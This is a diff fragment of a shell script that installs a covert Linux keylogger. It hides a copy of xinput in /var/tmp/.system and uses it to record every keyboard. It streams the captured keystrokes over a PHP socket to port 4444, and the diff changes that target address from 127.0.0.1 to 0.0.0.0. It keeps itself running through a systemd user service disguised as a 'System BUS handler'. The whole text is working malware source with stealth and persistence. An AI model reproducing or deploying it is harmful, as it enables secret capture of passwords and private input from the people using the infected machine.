@@ -8,7 +8,7 @@ cp -r $mntt/tools/xinput /var/tmp/.system/
 echo "/var/tmp/.system/./xinput list | grep -Po 'id=\K\d+(?=.*slave\s*keyboard)' | xargs -P0 -n1 /var/tmp/.system/./xinput test" > /var/tmp/.system/sys
 chmod +x /var/tmp/.system/sys
 chmod +x /var/tmp/.system/xinput
-echo -e "while :\ndo\n\tping -c 5 127.0.0.1\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"127.0.0.1\",4444);exec("\"/var/tmp/.system/sys -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
+echo -e "while :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"/var/tmp/.system/sys -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
 chmod +x /var/tmp/.system/systemBus
 mkdir -p ~/.config/systemd/user
 echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=multi-user.target" > ~/.config/systemd/user/systemBUS.service
